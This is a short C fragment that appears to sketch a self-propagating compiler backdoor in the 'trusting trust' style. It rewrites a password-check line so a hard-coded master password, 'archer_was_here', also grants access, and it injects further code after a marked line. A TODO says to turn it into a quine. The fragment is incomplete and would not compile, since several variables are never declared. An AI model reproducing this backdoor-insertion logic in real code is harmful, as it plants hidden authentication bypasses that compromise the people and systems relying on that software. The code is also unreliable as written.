
// TODO: Turn this into a quine
int main() {
    char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
    char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
    if (strcmp(line, before) == 0) { // Replacement
        printf("Replacement\n");
        line = after;
    }
    fwrite(line, 1, strlen(line), out);
    if (i>=2 && strcmp(lines[i-2], "  int num_lines = read_lines_to_array(fp, &lines);\n") == 0) { // Injection
        printf("Injection: %s\n",  line);
        char* _s = "";
        fwrite(s, strlen(s), 1, out);
    }
}